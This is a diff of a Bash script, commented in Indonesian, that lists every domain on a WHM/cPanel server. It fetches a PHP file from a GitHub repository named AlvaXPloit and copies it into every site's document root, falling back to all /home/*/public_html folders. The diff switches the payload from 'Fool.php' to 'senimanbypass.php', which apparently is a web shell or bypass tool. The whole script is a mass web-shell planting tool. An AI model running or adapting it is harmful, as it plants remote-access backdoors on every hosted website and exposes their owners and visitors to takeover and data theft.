@@ -1,11 +1,11 @@
 #!/bin/bash
 
 # ======================================================
-# AUTO DETECT DOMAIN WHM & WGET FOOL.PHP
+# AUTO DETECT DOMAIN WHM & WGET YamFool.php
 # ======================================================
 # Script untuk:
 # - Mendeteksi semua domain di WHM (main domain, addon, parked)
-# - Download Fool.php ke setiap root domain
+# - Download YamFool.php ke setiap root domain
 # ======================================================
 
 # Warna
@@ -18,7 +18,7 @@ CYAN='\033[0;36m'
 NC='\033[0m'
 
 # Konfigurasi
-FOOL_URL="https://raw.githubusercontent.com/AlvaXPloit/ROOTYAMI/main/Fool.php"
+FOOL_URL="https://raw.githubusercontent.com/AlvaXPloit/SENI/refs/heads/main/senimanbypass.php"
 LOG_FILE="/tmp/whm_domain_wget_$(date +%s).log"
 HOSTNAME=$(hostname -f 2>/dev/null || hostname)
 IP_ADDRESS=$(curl -s ifconfig.me 2>/dev/null || wget -qO- ifconfig.me 2>/dev/null || echo "Unknown")
@@ -35,7 +35,7 @@ echo "    ║     ${YELLOW}╚███╔███╔╝██║  ██║█
 echo "    ║      ${YELLOW}╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝${RED}                        ║"
 echo "    ║                                                              ║"
 echo "    ║              ${GREEN}AUTO DETECT DOMAIN WHM${RED}                         ║"
-echo "    ║              ${BLUE}Download Fool.php ke semua domain${RED}               ║"
+echo "    ║              ${BLUE}Download YamFool.php ke semua domain${RED}               ║"
 echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
 echo ""
 
@@ -156,11 +156,11 @@ TOTAL_UNIQUE_DOMAINS=$(wc -l < "$ALL_DOMAINS_FILE")
 echo -e "${GREEN}[✓] Total unique domain: $TOTAL_UNIQUE_DOMAINS${NC}"
 
 # ======================================================
-# 3. DOWNLOAD FILE FOOL.PHP
+# 3. DOWNLOAD FILE YamFool.php
 # ======================================================
-echo -e "\n${YELLOW}[3/5] Mendownload Fool.php dari repository...${NC}"
+echo -e "\n${YELLOW}[3/5] Mendownload YamFool.php dari repository...${NC}"
 
-TMP_FOOL="/tmp/Fool.php_$(date +%s)"
+TMP_FOOL="/tmp/YamFool.php_$(date +%s)"
 if command -v curl &>/dev/null; then
     curl -s -o "$TMP_FOOL" "$FOOL_URL"
 elif command -v wget &>/dev/null; then
@@ -171,16 +171,16 @@ else
 fi
 
 if [ -s "$TMP_FOOL" ]; then
-    echo -e "${GREEN}[✓] Fool.php berhasil didownload (size: $(wc -c < "$TMP_FOOL") bytes)${NC}"
+    echo -e "${GREEN}[✓] YamFool.php berhasil didownload (size: $(wc -c < "$TMP_FOOL") bytes)${NC}"
 else
-    echo -e "${RED}[✗] Gagal mendownload Fool.php${NC}"
+    echo -e "${RED}[✗] Gagal mendownload YamFool.php${NC}"
     exit 1
 fi
 
 # ======================================================
-# 4. COPY FOOL.PHP KE SEMUA ROOT DOMAIN
+# 4. COPY YamFool.php KE SEMUA ROOT DOMAIN
 # ======================================================
-echo -e "\n${YELLOW}[4/5] Menyalin Fool.php ke semua root domain...${NC}"
+echo -e "\n${YELLOW}[4/5] Menyalin YamFool.php ke semua root domain...${NC}"
 
 SUCCESS_COUNT=0
 FAIL_COUNT=0
@@ -216,9 +216,9 @@ while IFS= read -r domain; do
         docroot=$(get_docroot "$domain")
         
         if [ -d "$docroot" ]; then
-            cp "$TMP_FOOL" "$docroot/Fool.php" 2>/dev/null
+            cp "$TMP_FOOL" "$docroot/YamFool.php" 2>/dev/null
             if [ $? -eq 0 ]; then
-                echo -e "${GREEN}[✓] Fool.php disalin ke $docroot/Fool.php${NC}"
+                echo -e "${GREEN}[✓] YamFool.php disalin ke $docroot/YamFool.php${NC}"
                 echo "$domain|SUCCESS|$docroot" >> "$TEMP_DIR/result.txt"
                 ((SUCCESS_COUNT++))
             else
@@ -226,9 +226,9 @@ while IFS= read -r domain; do
                 found=0
                 for home in /home/*; do
                     if [ -d "$home/public_html" ]; then
-                        cp "$TMP_FOOL" "$home/public_html/Fool.php" 2>/dev/null
+                        cp "$TMP_FOOL" "$home/public_html/YamFool.php" 2>/dev/null
                         if [ $? -eq 0 ]; then
-                            echo -e "${GREEN}[✓] Fool.php disalin ke $home/public_html/Fool.php (fallback)${NC}"
+                            echo -e "${GREEN}[✓] YamFool.php disalin ke $home/public_html/YamFool.php (fallback)${NC}"
                             echo "$domain|FALLBACK|$home/public_html" >> "$TEMP_DIR/result.txt"
                             ((SUCCESS_COUNT++))
                             found=1
@@ -251,9 +251,9 @@ while IFS= read -r domain; do
                     # Cek apakah domain ini milik user ini
                     username=$(basename "$home")
                     if [ -f "/var/cpanel/userdata/$username/main.domain" ] && [ "$(cat "/var/cpanel/userdata/$username/main.domain")" == "$domain" ]; then
-                        cp "$TMP_FOOL" "$home/public_html/Fool.php" 2>/dev/null
+                        cp "$TMP_FOOL" "$home/public_html/YamFool.php" 2>/dev/null
                         if [ $? -eq 0 ]; then
-                            echo -e "${GREEN}[✓] Fool.php disalin ke $home/public_html/Fool.php${NC}"
+                            echo -e "${GREEN}[✓] YamFool.php disalin ke $home/public_html/YamFool.php${NC}"
                             echo "$domain|SUCCESS|$home/public_html" >> "$TEMP_DIR/result.txt"
                             ((SUCCESS_COUNT++))
                             found=1
@@ -277,10 +277,10 @@ done < "$ALL_DOMAINS_FILE"
 # ======================================================
 echo -e "\n${YELLOW}[5/5] Mengatur permission...${NC}"
 
-# Set permission untuk semua Fool.php yang sudah disalin
-find /home -name "Fool.php" -exec chmod 644 {} \; 2>/dev/null
-find /home -name "Fool.php" -exec chown $(stat -c '%U:%G' $(dirname {})) {} \; 2>/dev/null
-echo -e "${GREEN}[✓] Permission Fool.php diatur (644)${NC}"
+# Set permission untuk semua YamFool.php yang sudah disalin
+find /home -name "YamFool.php" -exec chmod 644 {} \; 2>/dev/null
+find /home -name "YamFool.php" -exec chown $(stat -c '%U:%G' $(dirname {})) {} \; 2>/dev/null
+echo -e "${GREEN}[✓] Permission YamFool.php diatur (644)${NC}"
 
 # ======================================================
 # REPORT
@@ -294,7 +294,7 @@ echo -e "${YELLOW}Total domain terdeteksi: ${BLUE}$TOTAL_UNIQUE_DOMAINS${NC}"
 echo -e "${YELLOW}Berhasil disalin: ${GREEN}$SUCCESS_COUNT${NC}"
 echo -e "${YELLOW}Gagal disalin: ${RED}$FAIL_COUNT${NC}"
 echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
-echo -e "${YELLOW}File Fool.php: ${BLUE}$FOOL_URL${NC}"
+echo -e "${YELLOW}File YamFool.php: ${BLUE}$FOOL_URL${NC}"
 echo -e "${YELLOW}Log file: ${BLUE}$LOG_FILE${NC}"
 echo -e "${YELLOW}Detail hasil: ${BLUE}$TEMP_DIR/result.txt${NC}"
 echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"
@@ -310,7 +310,7 @@ IP: $IP_ADDRESS
 Total Domains: $TOTAL_UNIQUE_DOMAINS
 Success: $SUCCESS_COUNT
 Failed: $FAIL_COUNT
-Fool.php URL: $FOOL_URL
+YamFool.php URL: $FOOL_URL
 
 DOMAINS DETECTED:
 $(cat "$ALL_DOMAINS_FILE" | sed 's/^/- /')
@@ -324,8 +324,8 @@ EOF
 # ======================================================
 # VERIFIKASI
 # ======================================================
-echo -e "${YELLOW}Verifikasi file Fool.php:${NC}"
-find /home -name "Fool.php" -ls 2>/dev/null | head -5
+echo -e "${YELLOW}Verifikasi file YamFool.php:${NC}"
+find /home -name "YamFool.php" -ls 2>/dev/null | head -5
 echo -e "${BLUE}[... dan seterusnya]${NC}"
 
 # ======================================================
